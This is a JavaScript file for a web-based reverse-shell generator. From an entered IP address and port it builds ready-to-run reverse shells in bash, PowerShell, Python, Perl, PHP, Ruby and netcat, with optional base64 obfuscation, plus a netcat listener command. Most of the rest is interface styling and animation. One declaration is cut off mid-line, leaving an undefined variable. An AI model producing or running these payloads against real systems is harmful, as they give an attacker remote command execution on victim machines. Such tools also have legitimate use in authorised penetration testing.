document.addEventListener('DOMContentLoaded', function() {
    // Set current year in footer
    document.getElementById('current-year').textContent = new Date().getFullYear();
    
    // DOM Elements
    const generateBtn = document.getElementById('generate-btn');
    const resultPanel = document.getElementById('result-panel');
    const shellCodeElement = document.getElementById('shell-code');
    const listenerCommandElement = document.getElementById('listener-command');
    const copyBtn = document.getElementById('copy-btn');
    const copyListenerBtn = document.getElementById('copy-listener-btn');
    const ipAddressInput = document.getElementById('ip-address');
    const portInput = document.getElementById('port');
    const shellTypeSelect = document.getElementById('shell-type');
    const encoding
    
    // Add button animation for all buttons with enhanced effects
    const buttons = document.querySelectorAll('.btn, .btn-icon-only');
    buttons.forEach(button => {
        button.addEventListener('mousedown', () => {
            button.style.transform = 'scale(0.95)';
            button.style.boxShadow = '0 0 5px var(--primary-glow)';
        });
        
        button.addEventListener('mouseup', () => {
            button.style.transform = '';
            button.style.boxShadow = '';
        });
        
        button.addEventListener('mouseleave', () => {
            button.style.transform = '';
            button.style.boxShadow = '';
        });
        
        // Add hover effect with ripple
        button.addEventListener('mouseover', function(e) {
            const ripple = document.createElement('span');
            ripple.classList.add('ripple-effect');
            
            const x = e.clientX - e.target.getBoundingClientRect().left;
            const y = e.clientY - e.target.getBoundingClientRect().top;
            
            ripple.style.left = `${x}px`;
            ripple.style.top = `${y}px`;
            
            this.appendChild(ripple);
            
            setTimeout(() => {
                ripple.remove();
            }, 600);
        });
    });
    
    // Generate shell code
    generateBtn.addEventListener('click', function() {
        const ipAddress = ipAddressInput.value.trim();
        const port = portInput.value.trim();
        const shellType = shellTypeSelect.value;
        const encoding = encodingSelect.value;
        
        // Validate inputs
        if (!ipAddress) {
            showNotification('Please enter an IP address', 'error');
            return;
        }
        
        if (!port || isNaN(parseInt(port)) || parseInt(port) < 1 || parseInt(port) > 65535) {
            showNotification('Please enter a valid port (1-65535)', 'error');
            return;
        }
        
        // Generate the shell code
        const { shellCode, listenerCommand } = generateShellCode(ipAddress, port, shellType, encoding);
        
        // Display results
        shellCodeElement.textContent = shellCode;
        listenerCommandElement.textContent = listenerCommand;
        
        // Show result panel with animation
        resultPanel.classList.remove('hidden');
        resultPanel.style.animation = 'none';
        resultPanel.offsetHeight; // Trigger reflow
        resultPanel.style.animation = 'fade-in 0.5s ease';
        
        // Scroll to result panel
        resultPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        
        showNotification('Shell code generated successfully!', 'success');
    });
    
    // Copy buttons functionality
    copyBtn.addEventListener('click', function() {
        copyToClipboard(shellCodeElement.textContent);
        showNotification('Shell code copied to clipboard!', 'success');
    });
    
    copyListenerBtn.addEventListener('click', function() {
        copyToClipboard(listenerCommandElement.textContent);
        showNotification('Listener command copied to clipboard!', 'success');
    });
    
    // Function to copy text to clipboard
    function copyToClipboard(text) {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
    }
    
    // Function to show notification
    function showNotification(message, type) {
        // Remove existing notification if any
        const existingNotification = document.querySelector('.notification');
        if (existingNotification) {
            existingNotification.remove();
        }
        
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
                <span>${message}</span>
            </div>
        `;
        
        // Add notification to DOM
        document.body.appendChild(notification);
        
        // Show notification with animation
        setTimeout(() => {
            notification.classList.add('show');
        }, 10);
        
        // Remove notification after delay
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                notification.remove();
            }, 300);
        }, 3000);
    }
    
    // Function to generate shell code
    function generateShellCode(ip, port, shellType, encoding) {
        let shellCode = '';
        let listenerCommand = '';
        
        // Base shell commands
        const shellCommands = {
            bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
            powershell: `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
            python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
            perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
            php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
            ruby: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
            netcat: `nc -e /bin/sh ${ip} ${port}`
        };
        
        // Get the base shell command
        shellCode = shellCommands[shellType];
        
        // Apply encoding if selected
        if (encoding === 'base64') {
            if (shellType === 'powershell') {
                const encodedCommand = btoa(shellCommands[shellType]);
                shellCode = `powershell -e ${encodedCommand}`;
            } else if (shellType === 'bash') {
                const encodedCommand = btoa(shellCommands[shellType]);
                shellCode = `echo ${encodedCommand} | base64 -d | bash`;
            } else {
                // For other shell types, just show what encoding would look like
                const encodedCommand = btoa(shellCommands[shellType]);
                shellCode = `# Base64 encoded command:\n${encodedCommand}\n\n# To execute:\necho ${encodedCommand} | base64 -d | sh`;
            }
        } else if (encoding === 'url') {
            shellCode = `# URL encoded command:\n${encodeURIComponent(shellCommands[shellType])}`;
        }
        
        // Generate listener command based on shell type
        if (shellType === 'powershell') {
            listenerCommand = `nc -lvnp ${port}`;
        } else {
            listenerCommand = `nc -lvnp ${port}`;
        }
        
        return { shellCode, listenerCommand };
    }
    
    // Create background animation with enhanced effects
    createBackgroundAnimation();
});

// Function to create background animation
function createBackgroundAnimation() {
    const background = document.querySelector('.background');
    
    // Create animated particles with enhanced effects
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        
        // Random properties for particles
        const size = Math.random() * 4 + 1;
        const posX = Math.random() * 100;
        const posY = Math.random() * 100;
        const delay = Math.random() * 5;
        const duration = Math.random() * 10 + 10;
        const opacity = Math.random() * 0.5 + 0.1;
        
        // Random particle types
        const particleType = Math.floor(Math.random() * 3);
        let particleClass = 'particle';
        
        if (particleType === 1) {
            particleClass += ' particle-square';
        } else if (particleType === 2) {
            particleClass += ' particle-triangle';
        }
        
        particle.className = particleClass;
        
        // Apply styles
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.left = `${posX}%`;
        particle.style.top = `${posY}%`;
        particle.style.animationDelay = `${delay}s`;
        particle.style.animationDuration = `${duration}s`;
        particle.style.opacity = opacity;
        
        // Add to background
        background.appendChild(particle);
    }
}

// Add CSS for notification, particles, and ripple effect
const style = document.createElement('style');
style.textContent = `
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        background: var(--panel-bg);
        border-radius: 10px;
        padding: 1rem;
        transform: translateX(150%);
        transition: transform 0.3s ease;
        z-index: 1000;
        box-shadow: 0 5px 15px var(--shadow-color);
        backdrop-filter: blur(5px);
    }
    
    .notification.show {
        transform: translateX(0);
    }
    
    .notification.success {
        border-left: 3px solid var(--success);
    }
    
    .notification.error {
        border-left: 3px solid var(--danger);
    }
    
    .notification-content {
        display: flex;
        align-items: center;
    }
    
    .notification-content i {
        margin-right: 10px;
        font-size: 1.2rem;
    }
    
    .notification.success i {
        color: var(--success);
    }
    
    .notification.error i {
        color: var(--danger);
    }
    
    .particle {
        position: absolute;
        background-color: var(--primary-color);
        border-radius: 50%;
        opacity: 0.3;
        animation: float linear infinite;
        box-shadow: 0 0 5px var(--primary-glow);
        z-index: -1;
    }
    
    .particle-square {
        border-radius: 2px;
        transform: rotate(45deg);
    }
    
    .particle-triangle {
        clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
    }
    
    @keyframes float {
        0% {
            transform: translateY(0) rotate(0deg);
        }
        100% {
            transform: translateY(-100vh) rotate(360deg);
        }
    }
    
    .ripple-effect {
        position: absolute;
        border-radius: 50%;
        background-color: rgba(255, 255, 255, 0.3);
        transform: scale(0);
        animation: ripple 0.6s linear;
        pointer-events: none;
    }
    
    @keyframes ripple {
        to {
            transform: scale(2.5);
            opacity: 0;
        }
    }
`;
document.head.appendChild(style);
